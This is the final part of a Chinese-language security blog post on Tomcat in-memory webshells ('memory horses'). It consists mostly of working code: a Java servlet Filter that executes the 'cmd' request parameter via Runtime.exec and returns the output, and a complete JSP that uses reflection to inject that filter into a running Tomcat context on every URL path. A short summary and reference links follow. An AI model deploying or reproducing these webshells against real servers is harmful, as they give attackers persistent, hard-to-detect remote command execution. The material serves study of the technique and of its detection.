+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">木马本体</span><br><span class="line">public class MyFilter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123;</span><br><span class="line">        String cmder &#x3D; req.getParameter(&quot;cmd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process ps &#x3D; Runtime.getRuntime().exec(cmder);</span><br><span class="line">            BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">            StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                &#x2F;&#x2F;执行结果加上回车</span><br><span class="line">                sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            String result &#x3D; sb.toString();</span><br><span class="line">            resp.getWriter().write(result);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            System.out.println(&quot;error &quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">    public void init(FilterConfig config) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>网上嫖的JSP</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;org.apache.catalina.Context&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.util.HashMap&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">     Object obj &#x3D; request.getServletContext();</span><br><span class="line">     Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj);</span><br><span class="line">     field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext);</span><br><span class="line"></span><br><span class="line">     FilterDef filterDef &#x3D; new FilterDef();</span><br><span class="line">     filterDef.setFilterName(&quot;testF&quot;);</span><br><span class="line">     standardContext.addFilterDef(filterDef);  &#x2F;&#x2F; 在context中添加filterMap时会去找一下是否存在对应的filterdef</span><br><span class="line">     Filter filter &#x3D; new testF();</span><br><span class="line">     filterDef.setFilter(filter); &#x2F;&#x2F; 将我们创建的filter与filterdef相关联起来</span><br><span class="line"></span><br><span class="line">     field &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">     field.setAccessible(true);</span><br><span class="line">     HashMap hashMap &#x3D;  (HashMap) field.get(standardContext);</span><br><span class="line">     Constructor constructor &#x3D; Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;).getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">     constructor.setAccessible(true);</span><br><span class="line">     hashMap.put(&quot;testF&quot;,constructor.newInstance(standardContext,filterDef));</span><br><span class="line"></span><br><span class="line">     FilterMap filterMap &#x3D; new FilterMap();</span><br><span class="line">     filterMap.addURLPattern(&quot;&#x2F;*&quot;);</span><br><span class="line">     filterMap.setFilterName(&quot;testF&quot;);</span><br><span class="line">     standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">     System.out.println(&quot;filter ok !&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">     public class testF implements Filter &#123;</span><br><span class="line">          public void destroy() &#123;</span><br><span class="line">          &#125;</span><br><span class="line">          public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123;</span><br><span class="line">               String cmder &#x3D; req.getParameter(&quot;cmd&quot;);</span><br><span class="line">               String[] cmd &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmder&#125;;</span><br><span class="line">               try &#123;</span><br><span class="line">                    Process ps &#x3D; Runtime.getRuntime().exec(cmd);</span><br><span class="line">                    BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream()));</span><br><span class="line">                    StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">                    String line;</span><br><span class="line">                    while ((line &#x3D; br.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                         &#x2F;&#x2F;执行结果加上回车</span><br><span class="line">                         sb.append(line).append(&quot;&lt;br&gt;&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    String result &#x3D; sb.toString();</span><br><span class="line">                    resp.getWriter().write(result);</span><br><span class="line">               &#125;catch (Exception e)&#123;</span><br><span class="line">                    System.out.println(&quot;error &quot;);</span><br><span class="line">               &#125;</span><br><span class="line">               chain.doFilter(req,resp);</span><br><span class="line">          &#125;</span><br><span class="line">          public void init(FilterConfig config) throws ServletException &#123;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122022432.png" alt="image-20210627122022432"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>个人感觉这篇文章写的比较乱，特别是Filter内存马。<br>这也是我拖了3个月才来搞的东西，这学期事有点多，很多之前想搞的东西都没腾出时间弄。<br>这篇文章讲到的内存马实际上并没有实现完全的无文件落地，中间会有恶意JSP文件落地。更高级的攻击形式后面再搞吧。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/">http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext">https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/116661899">https://blog.csdn.net/angry_program/article/details/116661899</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">ConsT27</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://const27.com/2021/06/27/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/">http://const27.com/2021/06/27/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/tomcat-Listener%EF%BC%8CFilter%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/">tomcat Listener，Filter内存马简要分析</a></div><div class="post_share"><div class="social-share" data-image="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bj.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mm_facetoface_collect_qrcode_1613729678854.png" target="_blank"><img class="post-qr-code-img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mm_facetoface_collect_qrcode_1613729678854.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/06/04/%E9%82%AE%E4%BB%B6%E5%8D%8F%E8%AE%AE%E4%B8%8E%E7%BB%95%E8%BF%87/"><img class="next-cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mv.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">邮件协议，邮件防护协议，以及绕过</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#tomcat%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">tomcat内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tomcat-%E5%AE%B9%E5%99%A8"><span class="toc-number">1.1.</span> <span class="toc-text">tomcat 容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Listener-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text">Listener 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ServletContext"><span class="toc-number">1.2.1.</span> <span class="toc-text">ServletContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ApplicationContext"><span class="toc-number">1.2.2.</span> <span class="toc-text">ApplicationContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99Listener%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.2.3.</span> <span class="toc-text">编写Listener内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">Filter 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#doFilter%E6%96%B9%E6%B3%95%E5%A6%82%E4%BD%95%E8%A2%AB%E6%89%A7%E8%A1%8C%EF%BC%9F"><span class="toc-number">1.3.1.</span> <span class="toc-text">doFilter方法如何被执行？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEfilter"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">配置filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#filterchain"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">filterchain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#filterconfig%E4%B8%8Efilterdef"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">filterconfig与filterdef</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E9%9D%A2%E7%9A%84%E4%B8%A4%E5%B1%82"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">下面的两层</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">加载过程流程图</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FilterDef%E6%B7%BB%E5%8A%A0"><span class="toc-number">1.3.2.</span> <span class="toc-text">FilterDef添加</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99Filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.3.3.</span> <span class="toc-text">编写Filter内存马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By ConsT27</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">怀念那一刹耀眼的火花</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
